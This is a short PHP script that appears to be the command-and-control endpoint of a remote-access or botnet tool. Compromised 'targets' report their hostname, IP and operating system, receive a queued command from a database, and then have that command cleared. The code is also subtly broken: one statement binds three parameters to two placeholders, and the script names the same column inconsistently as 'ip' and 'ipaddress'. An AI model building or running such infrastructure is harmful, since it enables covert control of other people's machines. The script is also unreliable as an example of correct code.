<?php 
include 'conn.php';

if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["operatingsystem"]))
{
    $commandQuery = $mysql->prepare("select command from targets where hostname=? and ip=? and operatingsystem=?");
    $commandQuery->bind_param("sss", $_POST["hostname"], $_POST["ip"], $_POST["operatingsystem"]);
    $commandQuery->execute();
    $commandQuery->store_result();
    $commandQuery->bind_result($command);
    $commandQuery->fetch();
    echo $command;
    $removeCommand = $mysql->prepare("update targets set command='' where hostname=? and ipaddress=?");
    $removeCommand->bind_param("sss", $_POST["hostname"], $_POST["ip"]);
    $removeCommand->execute();
}



?>
